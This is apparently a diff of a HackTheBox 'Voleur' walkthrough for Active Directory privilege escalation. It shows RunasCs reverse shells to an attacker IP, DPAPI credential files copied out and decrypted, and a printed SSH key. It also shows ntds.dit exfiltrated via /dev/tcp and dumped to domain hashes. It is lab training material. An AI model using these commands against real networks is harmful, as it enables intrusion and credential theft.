@@ -277,36 +277,6 @@ INFO: Compressing output into 20261006005501_bloodhound.zip
 
 ### Exploitation
 
-
-```shell
-sudo ntpdate DC.voleur.htb && python3 pywhisker.py -d "voleur.htb" -u "svc_ldap" --target "lacey.miller" --action "add" -k --dc-ip 10.129.232.130 --dc-host DC.voleur.htb -v
-2026-10-06 01:18:08.997778 (-0400) +28858.196057 +/- 0.015583 DC.voleur.htb 10.129.232.130 s1 no-leap
-CLOCK: time stepped by 28858.196057
-/home/kali/tools/pywhisker/pywhisker/pywhisker.py:356: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
-  now = datetime.datetime.utcnow()
-[*] Searching for the target account
-[*] Target user found: CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb
-[*] Generating certificate
-[*] Certificate generated
-[*] Generating KeyCredential
-[*] KeyCredential generated with DeviceID: 7a4db2e8-2afd-20d4-d786-fd85c858bd7c
-[*] Updating the msDS-KeyCredentialLink attribute of lacey.miller
-[+] Updated the msDS-KeyCredentialLink attribute of the target object
-[VERBOSE] No filename was provided. The certificate(s) will be stored with the filename: v9sSCXdM
-[VERBOSE] No pass was provided. The certificate will be stored with the password: oPOUL9gi633SqmNH6dXP
-[*] Converting PEM -> PFX with cryptography: v9sSCXdM.pfx
-[+] PFX exportiert nach: v9sSCXdM.pfx
-[i] Passwort für PFX: oPOUL9gi633SqmNH6dXP
-[+] Saved PFX (#PKCS12) certificate & key at path: v9sSCXdM.pfx
-[*] Must be used with password: oPOUL9gi633SqmNH6dXP
-[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
-[VERBOSE] Run the following command to obtain a TGT
-[VERBOSE] python3 PKINITtools/gettgtpkinit.py -cert-pfx v9sSCXdM.pfx -pfx-pass oPOUL9gi633SqmNH6dXP voleur.htb/lacey.miller v9sSCXdM.ccache
-
-```
-
-in theory should have worked but the machine is bugged as fuck
-
 ## Targeted kerberoast:
 
 ```
@@ -513,20 +483,726 @@ Clock skew detected. Adjusting local time by 8:00:58.545705. Retrying operation.
 [+] CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
 ```
 
+## Alternative
 
+```
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload RunasCs.exe
+                                        
+Info: Uploading /home/kali/tools/RunasCs/RunasCs.exe to C:\Users\svc_winrm\Documents\RunasCs.exe
+                                        
+Data: 68948 bytes of 68948 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.15.74:443
+[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-c9536$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6764 created in background.
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 
+
+```
+
+```
+rlwrap -cAr nc -lnvp 443
+listening on [any] 443 ...
+connect to [10.10.15.74] from (UNKNOWN) [10.129.232.130] 53642
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> whoami
+whoami
+voleur\svc_ldap
+PS C:\Windows\system32>  Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+ Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+
+
+Deleted           : True
+DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
+LastKnownParent   : OU=Second-Line Support Technicians,DC=voleur,DC=htb
+Name              : Todd Wolfe
+                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+ObjectClass       : user
+ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
+objectSid         : S-1-5-21-3927696377-1337352550-2781715495-1110
+
+
+
+PS C:\Windows\system32> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+
+
+Deleted           : True
+DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
+LastKnownParent   : OU=Second-Line Support Technicians,DC=voleur,DC=htb
+Name              : Todd Wolfe
+                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+ObjectClass       : user
+ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
+objectSid         : S-1-5-21-3927696377-1337352550-2781715495-1110
+
+
+
+PS C:\Windows\system32> 
+
+```
+
+## shell as ldap
+
+```
+PS C:\Windows\system32> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
+Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
+```
+
+```
+PS C:\tmp> ls
+ls
+
+
+    Directory: C:\tmp
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         10/6/2026  10:12 AM          51712 RunasCs.exe                                                          
+
+
+PS C:\tmp> .\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.15.74:4444 --bypass-uac
+.\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.15.74:4444 --bypass-uac
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-c9536$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 3280 created in background.
+PS C:\tmp> 
+
+```
+
+```
+rlwrap -cAr nc -lvnp 4444                                  
+listening on [any] 4444 ...
+connect to [10.10.15.74] from (UNKNOWN) [10.129.232.130] 53668
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> whoami
+whoami
+voleur\todd.wolfe
+PS C:\Windows\system32> 
+
+```
+
+## Lateral Movement from todd.wolfe to james
+
+```
+PS C:\> ls
+ls
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         1/29/2025   1:10 AM                Finance                                                              
+d-----         1/29/2025   1:10 AM                HR                                                                   
+d-----         5/29/2025   3:07 PM                inetpub                                                              
+d-----         1/29/2025   1:10 AM                IT                                                                   
+d-----          5/8/2021   1:20 AM                PerfLogs                                                             
+d-r---         7/24/2025   1:10 PM                Program Files                                                        
+d-----         1/30/2025   5:53 AM                Program Files (x86)                                                  
+d-----         10/6/2026  10:12 AM                tmp                                                                  
+d-r---         1/30/2025   3:38 AM                Users                                                                
+d-----          6/5/2025  12:53 PM                Windows                                                              
+
+
+PS C:\> cd IT
+cd IT
+PS C:\IT> ls
+ls
+
+
+    Directory: C:\IT
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         1/29/2025   1:40 AM                First-Line Support                                                   
+d-----         1/29/2025   7:13 AM                Second-Line Support                                                  
+d-----         1/30/2025   8:11 AM                Third-Line Support                                                   
+
+
+PS C:\IT> cd 'Second-Line Support'
+cd 'Second-Line Support'
+PS C:\IT\Second-Line Support> ls
+ls
+
+
+    Directory: C:\IT\Second-Line Support
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         1/29/2025   7:13 AM                Archived Users                                                       
+
+
+PS C:\IT\Second-Line Support> cd Archived Users
+cd Archived Users
+Set-Location : A positional parameter cannot be found that accepts argument 'Users'.
+At line:1 char:1
++ cd Archived Users
++ ~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Set-Location], ParameterBindingException
+    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+ 
+PS C:\IT\Second-Line Support> cd "Archived Users"
+cd "Archived Users"
+PS C:\IT\Second-Line Support\Archived Users> ls
+ls
+
+
+    Directory: C:\IT\Second-Line Support\Archived Users
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         1/29/2025   7:13 AM                todd.wolfe                                                           
+
+
+PS C:\IT\Second-Line Support\Archived Users> cd todd.wolfe
+cd todd.wolfe
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> ls
+ls
+
+
+    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-r---         1/29/2025   7:13 AM                3D Objects                                                           
+d-r---         1/29/2025   7:13 AM                Contacts                                                             
+d-r---         1/30/2025   6:28 AM                Desktop                                                              
+d-r---         1/29/2025   7:13 AM                Documents                                                            
+d-r---         1/29/2025   7:13 AM                Downloads                                                            
+d-r---         1/29/2025   7:13 AM                Favorites                                                            
+d-r---         1/29/2025   7:13 AM                Links                                                                
+d-r---         1/29/2025   7:13 AM                Music                                                                
+d-r---         1/29/2025   7:13 AM                Pictures                                                             
+d-r---         1/29/2025   7:13 AM                Saved Games                                                          
+d-r---         1/29/2025   7:13 AM                Searches                                                             
+d-r---         1/29/2025   7:13 AM                Videos                                                               
+
+
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> dir /a
+dir /a
+dir : Cannot find path 'C:\a' because it does not exist.
+At line:1 char:1
++ dir /a
++ ~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\a:String) [Get-ChildItem], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+ 
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> dir appdata
+dir appdata
+
+
+    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         1/29/2025   7:13 AM                Local                                                                
+d-----         1/29/2025   7:13 AM                LocalLow                                                             
+d-----         1/29/2025   7:13 AM                Roaming                                                              
+
+
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> cd appdata
+cd appdata
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata> cd Roaming
+cd Roaming
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming> dir
+dir
+
+
+    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         1/29/2025   7:13 AM                Adobe                                                                
+d---s-         1/29/2025   7:13 AM                Microsoft                                                            
+
+
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming> cd Microsoft
+cd Microsoft
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft> dir
+dir
+
+
+    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d---s-         1/29/2025   7:13 AM                Credentials                                                          
+d---s-         1/29/2025   7:13 AM                Crypto                                                               
+d-----         1/29/2025   7:13 AM                Internet Explorer                                                    
+d-----         1/29/2025   7:13 AM                Network                                                              
+d---s-         1/29/2025   7:13 AM                Protect                                                              
+d-----          5/8/2021   1:20 AM                Spelling                                                             
+d---s-         1/29/2025   7:13 AM                SystemCertificates                                                   
+d-----         1/29/2025   4:54 AM                Vault                                                                
+d-----         1/29/2025   7:13 AM                Windows                                                              
+
+
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft> cd Credentials
+cd Credentials
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials> ls
+ls
+
+
+    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         1/29/2025   4:55 AM            398 772275FAD58525253490A9B0039791D3                                     
+
+
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials> 
+
+```
+
+copying the file to kali:
+
+```
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials> net use \\10.10.15.74\share /user:test test
+net use \\10.10.15.74\share /user:test test
+The command completed successfully.
+
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials> copy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
+copy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
+
+```
+
+master key (?)
+
+```
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect> ls
+ls
+
+
+    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d---s-         1/29/2025   7:13 AM                S-1-5-21-3927696377-1337352550-2781715495-1110                       
+
+
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect> cd Ccopy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
+cd Ccopy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
+Set-Location : A positional parameter cannot be found that accepts argument '772275FAD58525253490A9B0039791D3'.
+At line:1 char:1
++ cd Ccopy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Set-Location], ParameterBindingException
+    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+ 
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect> cd S-1-5-21-3927696377-1337352550-2781715495-1110
+cd S-1-5-21-3927696377-1337352550-2781715495-1110
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110> ls
+ls
+
+
+    Directory: C:\IT\Second-Line Support\Archived 
+    Users\todd.wolfe\appdata\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         1/29/2025   4:53 AM            740 08949382-134f-4c63-b93c-ce52efc0aa88                                 
+
+```
+
+```
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110> copy 08949382-134f-4c63-b93c-ce52efc0aa88 \\10.10.15.74\share
+copy 08949382-134f-4c63-b93c-ce52efc0aa88 \\10.10.15.74\share
+
+```
+
+## decrypting
+
+```
+impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password 'NightT1meP1dg3on14'   
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
+Flags       :        0 (0)
+Policy      :        0 (0)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+
+```
+
+```
+impacket-dpapi credential -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 -file 772275FAD58525253490A9B0039791D3
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2025-01-29 12:55:19+00:00
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=Jezzas_Account
+Description : 
+Unknown     : 
+Username    : jeremy.combs
+Unknown     : qT3V9pLXyN7W4m
+
+
+```
+
+```
+PS C:\tmp> .\RunasCs.exe jeremy.combs qT3V9pLXyN7W4m  powershell -r 10.10.15.74:4445 --bypass-uac
+.\RunasCs.exe jeremy.combs qT3V9pLXyN7W4m  powershell -r 10.10.15.74:4445 --bypass-uac
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-c9536$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2476 created in background.
+PS C:\tmp> 
+
+```
+
+```
+rlwrap -cAr nc -lvnp 4445                                  
+listening on [any] 4445 ...
+connect to [10.10.15.74] from (UNKNOWN) [10.129.232.130] 53203
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> whoami
+whoami
+voleur\jeremy.combs
+PS C:\Windows\system32> 
+
+```
+
+## Lateral movement from jeremy to svc_backup
+
+```
+PS C:\IT> cd 'Third-Line Support'
+cd 'Third-Line Support'
+PS C:\IT\Third-Line Support> ls
+ls
+
+
+    Directory: C:\IT\Third-Line Support
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         1/30/2025   8:11 AM                Backups                                                              
+-a----         1/30/2025   8:10 AM           2602 id_rsa                                                               
+-a----         1/30/2025   8:07 AM            186 Note.txt.txt                                                         
+
+
+PS C:\IT\Third-Line Support> cat Note.txt.txt
+cat Note.txt.txt
+Jeremy,
+
+I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.
+
+Please see what you can set up.
+
+Thanks,
+
+Admin
+PS C:\IT\Third-Line Support> 
+
+```
+
+```
+PS C:\IT\Third-Line Support> cat id_rsa
+cat id_rsa
+```
+
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAqFyPMvURW/qbyRlemAMzaPVvfR7JNHznL6xDHP4o/hqWIzn3dZ66
+P2absMgZy2XXGf2pO0M13UidiBaF3dLNL7Y1SeS/DMisE411zHx6AQMepj0MGBi/c1Ufi7
+rVMq+X6NJnb2v5pCzpoyobONWorBXMKV9DnbQumWxYXKQyr6vgSrLd3JBW6TNZa3PWThy9
+wrTROegdYaqCjzk3Pscct66PhmQPyWkeVbIGZAqEC/edfONzmZjMbn7duJwIL5c68MMuCi
+9u91MA5FAignNtgvvYVhq/pLkhcKkh1eiR01TyUmeHVJhBQLwVzcHNdVk+GO+NzhyROqux
+haaVjcO8L3KMPYNUZl/c4ov80IG04hAvAQIGyNvAPuEXGnLEiKRcNg+mvI6/sLIcU5oQkP
+JM7XFlejSKHfgJcP1W3MMDAYKpkAuZTJwSP9ISVVlj4R/lfW18tKiiXuygOGudm3AbY65C
+lOwP+sY7+rXOTA2nJ3qE0J8gGEiS8DFzPOF80OLrAAAFiIygOJSMoDiUAAAAB3NzaC1yc2
+EAAAGBAKhcjzL1EVv6m8kZXpgDM2j1b30eyTR85y+sQxz+KP4aliM593Weuj9mm7DIGctl
+1xn9qTtDNd1InYgWhd3SzS+2NUnkvwzIrBONdcx8egEDHqY9DBgYv3NVH4u61TKvl+jSZ2
+9r+aQs6aMqGzjVqKwVzClfQ520LplsWFykMq+r4Eqy3dyQVukzWWtz1k4cvcK00TnoHWGq
+go85Nz7HHLeuj4ZkD8lpHlWyBmQKhAv3nXzjc5mYzG5+3bicCC+XOvDDLgovbvdTAORQIo
+JzbYL72FYav6S5IXCpIdXokdNU8lJnh1SYQUC8Fc3BzXVZPhjvjc4ckTqrsYWmlY3DvC9y
+jD2DVGZf3OKL/NCBtOIQLwECBsjbwD7hFxpyxIikXDYPpryOv7CyHFOaEJDyTO1xZXo0ih
+34CXD9VtzDAwGCqZALmUycEj/SElVZY+Ef5X1tfLSool7soDhrnZtwG2OuQpTsD/rGO/q1
+zkwNpyd6hNCfIBhIkvAxczzhfNDi6wAAAAMBAAEAAAGBAIrVgPSZaI47s5l6hSm/gfZsZl
+p8N5lD4nTKjbFr2SvpiqNT2r8wfA9qMrrt12+F9IInThVjkBiBF/6v7AYHHlLY40qjCfSl
+ylh5T4mnoAgTpYOaVc3NIpsdt9zG3aZlbFR+pPMZzAvZSXTWdQpCDkyR0QDQ4PY8Li0wTh
+FfCbkZd+TBaPjIQhMd2AAmzrMtOkJET0B8KzZtoCoxGWB4WzMRDKPbAbWqLGyoWGLI1Sj1
+MPZareocOYBot7fTW2C7SHXtPFP9+kagVskAvaiy5Rmv2qRfu9Lcj2TfCVXdXbYyxTwoJF
+ioxGl+PfiieZ6F8v4ftWDwfC+Pw2sD8ICK/yrnreGFNxdPymck+S8wPmxjWC/p0GEhilK7
+wkr17GgC30VyLnOuzbpq1tDKrCf8VA4aZYBIh3wPfWFEqhlCvmr4sAZI7B+7eBA9jTLyxq
+3IQpexpU8BSz8CAzyvhpxkyPXsnJtUQ8OWph1ltb9aJCaxWmc1r3h6B4VMjGILMdI/KQAA
+AMASKeZiz81mJvrf2C5QgURU4KklHfgkSI4p8NTyj0WGAOEqPeAbdvj8wjksfrMC004Mfa
+b/J+gba1MVc7v8RBtKHWjcFe1qSNSW2XqkQwxKb50QD17TlZUaOJF2ZSJi/xwDzX+VX9r+
+vfaTqmk6rQJl+c3sh+nITKBN0u7Fr/ur0/FQYQASJaCGQZvdbw8Fup4BGPtxqFKETDKC09
+41/zTd5viNX38LVig6SXhTYDDL3eyT5DE6SwSKleTPF+GsJLgAAADBANMs31CMRrE1ECBZ
+sP+4rqgJ/GQn4ID8XIOG2zti2pVJ0dx7I9nzp7NFSrE80Rv8vH8Ox36th/X0jme1AC7jtR
+B+3NLjpnGA5AqcPklI/lp6kSzEigvBl4nOz07fj3KchOGCRP3kpC5fHqXe24m3k2k9Sr+E
+a29s98/18SfcbIOHWS4AUpHCNiNskDHXewjRJxEoE/CjuNnrVIjzWDTwTbzqQV+FOKOXoV
+B9NzMi0MiCLy/HJ4dwwtce3sssxUk7pQAAAMEAzBk3mSKy7UWuhHExrsL/jzqxd7bVmLXU
+EEju52GNEQL1TW4UZXVtwhHYrb0Vnu0AE+r/16o0gKScaa+lrEeQqzIARVflt7ZpJdpl3Z
+fosiR4pvDHtzbqPVbixqSP14oKRSeswpN1Q50OnD11tpIbesjH4ZVEXv7VY9/Z8VcooQLW
+GSgUcaD+U9Ik13vlNrrZYs9uJz3aphY6Jo23+7nge3Ui7ADEvnD3PAtzclU3xMFyX9Gf+9
+RveMEYlXZqvJ9PAAAADXN2Y19iYWNrdXBAREMBAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+
+```
+
+```
+ssh -i id_rsa.key svc_backup@voleur.htb -p 2222
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Oct  6 10:59:07 PDT 2026
+
+  System load:    0.52      Processes:             9
+  Usage of /home: unknown   Users logged in:       0
+  Memory usage:   35%       IPv4 address for eth0: 10.129.232.130
+  Swap usage:     0%
+
+
+363 updates can be installed immediately.
+257 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
+ * Starting OpenBSD Secure Shell server sshd           
+```
+
+```
+svc_backup@DC:~$ sudo -l
+Matching Defaults entries for svc_backup on DC:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User svc_backup may run the following commands on DC:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+
+```
+
+```
+svc_backup@DC:~$ sudo su
+root@DC:/home/svc_backup# whoami
+root
+
+```
 ---
 ## Privilege Escalation
 
 ### Enumeration
 
-What you found that leads to root/admin.
+```
+root@DC:/mnt/c# cd IT
+root@DC:/mnt/c/IT# ls
+'First-Line Support'  'Second-Line Support'  'Third-Line Support'
+root@DC:/mnt/c/IT# cd 'Third-Line Support'
+root@DC:/mnt/c/IT/Third-Line Support# ls
+Backups  Note.txt.txt  id_rsa
+root@DC:/mnt/c/IT/Third-Line Support# cd Backups
+root@DC:/mnt/c/IT/Third-Line Support/Backups# ls
+'Active Directory'   registry
+root@DC:/mnt/c/IT/Third-Line Support/Backups# cd 'Active Directory'
+root@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory# ls
+ntds.dit  ntds.jfm
+root@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory# cd ..
+root@DC:/mnt/c/IT/Third-Line Support/Backups# cd registry
+root@DC:/mnt/c/IT/Third-Line Support/Backups/registry# ls
+SECURITY  SYSTEM
+
+```
+
+```
+root@DC:/tmp# cp /mnt/c/IT/'Third-Line Support'/Backups/registry/SYSTEM .
+
+```
+
+```
+root@DC:/tmp# cp /mnt/c/IT/'Third-Line Support'/Backups/'Active Directory'/ntds.dit .
+
+```
+
+```
+root@DC:/tmp# cat /tmp/ntds.dit > /dev/tcp/10.10.15.74/9001
+root@DC:/tmp# cat /tmp/SYSTEM > /dev/tcp/10.10.15.74/9001
+root@DC:/tmp# 
+
+```
+
+```
+┌──(kali㉿kali)-[~/machines/voleur]
+└─$ nc -lvnp 9001 > ntds.dit                                
+listening on [any] 9001 ...
+connect to [10.10.15.74] from (UNKNOWN) [10.129.232.130] 61333
+                                                                                                                
+┌──(kali㉿kali)-[~/machines/voleur]
+└─$ nc -lvnp 9001 > SYSTEM                                  
+listening on [any] 9001 ...
+connect to [10.10.15.74] from (UNKNOWN) [10.129.232.130] 61336
+                                                                          
+```
 
 ### Exploitation
 
 Step-by-step privilege escalation.
 
 ```shell
-# Commands used
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+```
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
+voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
+voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
+voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
+voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
+voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
+voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
+voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
+voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
+[*] Kerberos keys from ntds.dit 
+Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
+Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
+Administrator:des-cbc-md5:459d836b9edcd6b0
